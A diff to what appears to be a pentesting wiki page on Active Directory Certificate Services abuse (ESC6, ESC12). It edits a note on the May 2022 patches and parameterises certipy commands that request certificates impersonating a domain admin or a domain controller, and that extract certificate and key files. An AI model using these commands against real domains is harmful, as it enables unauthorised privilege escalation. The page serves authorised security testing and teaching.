@@ -19,7 +19,7 @@ When the flag is set on the CA, templates configured for authentication (i.e. EK
 > If the CA is configured with the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag (admins tend to enable that flag without knowing the security implications), and the User template is enabled (which is very often), any user can escalate to domain admin.
 
 > [!CAUTION]
-> [May 2022 security updates](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923) broke the ESC6 attack.
+> The May 2022 patch wave (KB5014754) broke the ESC6 attack by introducing the `szOID_NTDS_CA_SECURITY_EXT` security extension that embeds the requester's SID in issued certificates, preventing SAN-based impersonation. Note that CVE-2022-26923 (Certifried) is a separate vulnerability fixed in the same patch cycle. It is distinct from ESC6. ESC6 may still be exploitable on environments where `StrongCertificateBindingEnforcement` is set to `0` (disabling strong mapping enforcement entirely).
 
 
 ### YubiHSM Key Storage Provider
@@ -55,10 +55,10 @@ Once the right template is found (i.e. the default User template) ([how to enume
 
 ```bash
 # To specify a user account in the SAN
-certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca 'ca_name' -template 'vulnerable template' -upn 'domain admin'
+certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca "$CA_NAME" -template "$TEMPLATE" -upn 'domain admin'
 
 # To specify a computer account in the SAN
-certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca 'ca_name' -template 'vulnerable template' -dns 'dc.domain.local'
+certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca "$CA_NAME" -template "$TEMPLATE" -dns "$DC_HOST"
 ```
 
 The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.
@@ -131,7 +131,7 @@ At the time of writing, no solution exists to perform this attack from a UNIX-li
 
 Retrieve a valid certificate  :
 ```powershell
-certipy req -target $ADCS_HOST -dc-ip $DC_IP -u "$USER@$DOMAIN" -p '$PASSWORD' -template User -ca <CA-Common-Name>
+certipy req -target $ADCS_HOST -dc-ip $DC_IP -u "$USER@$DOMAIN" -p "$PASSWORD" -template User -ca <CA-Common-Name>
 certipy cert -pfx user_esc12.pfx -nokey -out user_esc12.crt
 certipy cert -pfx user_esc12.pfx -nocert -out user_esc12.key
 ```
